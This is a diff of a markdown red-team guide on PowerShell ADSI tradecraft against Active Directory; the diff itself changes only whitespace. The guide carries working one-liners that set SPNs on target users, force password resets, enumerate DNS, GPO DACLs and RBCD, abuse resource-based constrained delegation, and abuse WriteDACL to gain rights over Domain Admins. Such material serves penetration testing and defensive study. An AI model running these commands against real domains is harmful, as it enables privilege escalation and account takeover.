@@ -221,7 +221,6 @@ InvokeGet and InvokeSet methods allow us to get and set the ADSI property value 
 $entry=[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=targetuser)").FindOne().GetDirectoryEntry();$entry.InvokeSet("servicePrincipalName","customspn/targetuser");$entry.CommitChanges()
 
 $entry=[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=targetuser)").FindOne().GetDirectoryEntry();$entry.Properties["servicePrincipalName"].Value="customspn/targetuser";$entry.CommitChanges()
-
 ```
 
 The "Properties" gets the Active Directory Domain Services properties for the DirectoryEntry object whereas the "InvokeGet"/"InvokeSet" gets/sets a property from the native Active Directory Domain Services object.
@@ -234,7 +233,6 @@ RefreshCache is extremely useful if we need certain constructed attributes of ob
 
 ```powershell
 $entry=[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=myuser)").FindOne().GetDirectoryEntry();$entry.RefreshCache("tokengroups");$entry.Properties["tokengroups"]|ForEach-Object{$sid=(New-Object System.Security.Principal.SecurityIdentifier($_,0)).toString();(New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount])}
-
 ```
 
 Back to the Invoke method, it could be quite handy in some cases comparing to the "not recommended" InvokeGet/InvokeSet. For example, ADSI has a interface called [IADsUser](https://docs.microsoft.com/en-us/windows/win32/api/iads/nn-iads-iadsuser), which allows us to access and manipulate end-user account data. One notable method is "SetPassword", it attempts to modify the password with different methods. First it will use the LDAP over SSL to set the password. If if failed, it will use Kerberos set password protocol to modify the password. And if that also failed, a Net* API remote procedure call will be initiated to set the password.
@@ -243,7 +241,6 @@ Imagine a scenario: During a red team engagement, you find that you have the `Fo
 
 ```powershell
 [adsisearcher]::new([adsi]"LDAP://domain.local", "(name=targetuser)").FindOne().GetDirectoryEntry().Invoke("setPassword", "newpassword")
-
 ```
 
 #### Sample Commands
@@ -251,21 +248,27 @@ Imagine a scenario: During a red team engagement, you find that you have the `Fo
 Here are a few useful commands I use frequently just for reference:
 
 - Get Domain SID
+
 `(New-Object System.Security.Principal.SecurityIdentifier([byte[]](([adsi]"LDAP://domain.local").Properties."objectSID")[0],0)).toString()`
 
 - Get DNS Records
+
 `([adsisearcher]::new(([adsi]"LDAP://DC=DomainDnsZones,DC=domain,DC=local"),"(&(objectClass=*)(!(DC=@))(!(DC=*DnsZones))(!(DC=*arpa))(!(DC=_*))(!dNSTombstoned=TRUE))")).FindAll() | foreach {$_.Properties["name"] ; try{$dnsByte=[byte[]]($_.Properties["dnsrecord"][0]); if ([int]$dnsByte[2]=1) {"{0}.{1}.{2}.{3}" -f $dnsByte[24],$dnsByte[25],$dnsByte[26],$dnsByte[27]}}catch{}}`
 
 - Get DACL of GPOs
+
 `([adsisearcher]::new([adsi]"LDAP://CN=Policies,CN=System,DC=domain,DC=local","(objectCategory=groupPolicyContainer)")).FindAll() | foreach {$_.Properties."displayname" ; $_.GetDirectoryEntry().ObjectSecurity.Access}`
 
 - Identify Resources-Based Constrained Delegation (RBCD)
+
 `([adsisearcher]::new(([adsi]"LDAP://DC=domain,DC=local"),"(msDS-AllowedToActOnBehalfOfOtherIdentity=*)")).FindAll()| ForEach-Object {$_.Properties["distinguishedname"]; ConvertFrom-SddlString (New-Object Security.AccessControl.RawSecurityDescriptor([byte[]]$_.Properties["msds-allowedtoactonbehalfofotheridentity"][0],0)).GetSddlForm([Security.AccessControl.AccessControlSections]::Access) | select DiscretionaryAcl|fl}`
 
 - Abuse RBCD
+
 `$targetEntry = ([adsisearcher]::new(([adsi]"LDAP://domain.local"),"(name=MYHOST)")).FindOne().GetDirectoryEntry(); $sid=(New-Object System.Security.Principal.SecurityIdentifier([byte[]]([adsisearcher]"(name=TARGETHOST)").FindOne().properties.objectsid[0],0)).toString();$sd=(New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)")); $buf = (New-Object byte[] $sd.BinaryLength); $sd.GetBinaryForm($buf, 0);$targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Value = $buf;$targetEntry.CommitChanges();`
 
 - Abuse WriteDACL to add oneself to the target group
+
 `$TargetUserSid=(New-Object System.Security.Principal.SecurityIdentifier([byte[]]([adsisearcher]"(name=myuser)").FindOne().properties.objectsid[0],0)).toString();$TargetEntry=[adsi]"LDAP://CN=Domain Admins,CN=Users,DC=domain,DC=local";$TargetEntry.PsBase.Options.SecurityMasks='Dacl';$TargetEntry.PsBase.ObjectSecurity.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule(([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$TargetUserSid)), ([System.DirectoryServices.ActiveDirectoryRights]'WriteProperty'),([System.Security.AccessControl.AccessControlType]'Allow'), ([System.DirectoryServices.ActiveDirectorySecurityInheritance]'None'))));$TargetEntry.PsBase.CommitChanges()`
 
 
